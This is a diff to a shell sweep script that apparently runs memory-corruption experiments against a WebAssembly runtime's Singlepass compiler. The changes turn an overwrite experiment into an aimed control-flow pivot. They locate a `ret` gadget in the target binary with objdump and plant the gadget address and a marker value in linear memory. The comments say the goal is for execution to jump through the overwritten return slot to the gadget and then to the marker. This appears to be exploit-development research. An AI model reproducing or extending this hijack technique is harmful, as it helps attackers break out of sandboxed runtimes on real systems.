@@ -114,32 +114,35 @@ done
 python3 gen_writestream.py patterns/ws_sparse_1024_512.wat 1024 512
 run_writestream lab-742-sp patterns/ws_sparse_1024_512.wat 400000 1 "sparse1024o512" "patterns/ws_drift.wat" 8
 
-echo "=== [7/7] E4 nested holder/trigger (calibrated overwrite) ==="
+echo "=== [7/7] E4/E5/E6 nested holder/trigger (overwrite + aimed pivot) ==="
 run_nested() {
   local lab="$1" pat="$2" iters="$3" stride="$4" tag="$5"
-  local warm="${6:-}" warmn="${7:-0}" holder_tag="${8:-7}"
-  timeout 900 "./$lab/target/release/$lab" nested "$pat" "$iters" "$stride" "$warm" "$warmn" "$holder_tag" \
+  local warm="${6:-}" warmn="${7:-0}" holder_tag="${8:-7}" gadget="${9:-0x0}" marker="${10:-0x4242424242424242}"
+  timeout 900 "./$lab/target/release/$lab" nested "$pat" "$iters" "$stride" "$warm" "$warmn" "$holder_tag" "$gadget" "$marker" \
     >"$OUT/nested-$lab-$tag.json" 2>"$OUT/nested-$lab-$tag.scans"
   local rc=$?
   echo "--- nested $lab $tag iters=$iters (exit=$rc) ---" | tee -a "$OUT/sweep.log"
-  grep -E "^(NESTED|CRASH)" "$OUT/nested-$lab-$tag.scans" 2>/dev/null | tail -6 | sed 's/^/  /' | cut -c1-220 | tee -a "$OUT/sweep.log"
-  echo "  last scan:" | tee -a "$OUT/sweep.log"
-  grep -E "^SCAN" "$OUT/nested-$lab-$tag.scans" 2>/dev/null | tail -1 | cut -c1-320 | sed 's/^/  /' | tee -a "$OUT/sweep.log"
+  grep -E "^(NESTED|CRASH)" "$OUT/nested-$lab-$tag.scans" 2>/dev/null | tail -5 | sed 's/^/  /' | cut -c1-220 | tee -a "$OUT/sweep.log"
   if [ -s "$OUT/nested-$lab-$tag.json" ]; then
     sed 's/^/  /' "$OUT/nested-$lab-$tag.json" | tee -a "$OUT/sweep.log"
   fi
 }
-# E5 pivot sweep: live values are computed constants 0x0041414141414100+K (Singlepass does
-# not constant-fold, so the constant stays in a register and is pushed into the batch).
-# If such a slot lands on the holder's return slot, the holder jumps to the marker value.
+# E6: find a `ret` gadget in the lab binary (offset; PIE base resolved at runtime)
+BIN="./lab-422-sp/target/release/lab-422-sp"
+GADGET_OFF=$(objdump -d "$BIN" 2>/dev/null | grep -m1 -E '^\s*[0-9a-f]+:\s+c3\s' | awk '{print $1}' | tr -d ':')
+if [ -z "$GADGET_OFF" ]; then GADGET_OFF="0"; echo "no ret gadget found" | tee -a "$OUT/sweep.log"; else echo "ret gadget offset: 0x$GADGET_OFF" | tee -a "$OUT/sweep.log"; fi
+# E6 aimed-pivot sweep: live values are LOADED from linear memory (the host plants the
+# gadget address + chain marker at 64+8k before the call). If a planted slot lands on the
+# holder's return slot, execution jumps to the gadget (`ret`), pops the next planted qword,
+# and jumps again -> fault address = the marker.
 for R in $(seq 234 300); do
   OFF=$((512 - R))
-  PAT="patterns/ws_pivot_r${R}.wat"
-  python3 gen_writestream.py "$PAT" 512 "$OFF" pivot > /dev/null
+  PAT="patterns/ws_load_r${R}.wat"
+  python3 gen_writestream.py "$PAT" 512 "$OFF" load > /dev/null
   ITERS=$((65536 + R + 1))
-  run_nested lab-422-sp "$PAT" "$ITERS" 1 "pivot_r${R}" "patterns/ws_drift.wat" 8 7
+  run_nested lab-422-sp "$PAT" "$ITERS" 1 "load_r${R}" "patterns/ws_drift.wat" 8 7 "0x$GADGET_OFF" 0x4242424242424242
 done
-run_nested lab-742-sp patterns/ws_pivot_r256.wat 65793 1 "pivot_r256" "patterns/ws_drift.wat" 8 7
+run_nested lab-742-sp patterns/ws_load_r256.wat 65793 1 "load_r256" "patterns/ws_drift.wat" 8 7 "0x0" 0x4242424242424242
 
 echo "=== results ==="
 ls -la "$OUT"
